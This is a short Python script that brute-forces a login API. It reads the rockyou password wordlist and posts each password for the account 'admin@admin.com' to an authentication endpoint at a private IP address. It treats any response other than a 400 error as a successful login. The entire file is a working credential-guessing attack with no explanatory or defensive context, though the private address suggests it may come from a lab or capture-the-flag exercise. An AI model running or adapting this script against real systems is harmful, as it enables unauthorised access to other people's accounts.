import requests

# Target API details
url = "http://192.168.96.156:9443/api/auth"
headers = {"Content-Type": "application/json"}
email = "admin@admin.com"
wordlist_path = "/usr/share/wordlists/rockyou.txt"

# Read the wordlist
with open(wordlist_path, "r", encoding="latin-1") as file:
    passwords = file.read().splitlines()

# Brute-force loop
for password in passwords:
    data = {"email": email, "password": password}
    response = requests.post(url, json=data, headers=headers)

    # Check if login is successful
    if response.status_code != 400:
        print(f"[SUCCESS] Password found: {password}")
        break 
    else:
        print(f"[FAILED] Tried: {password}")

print("Brute force finished.")
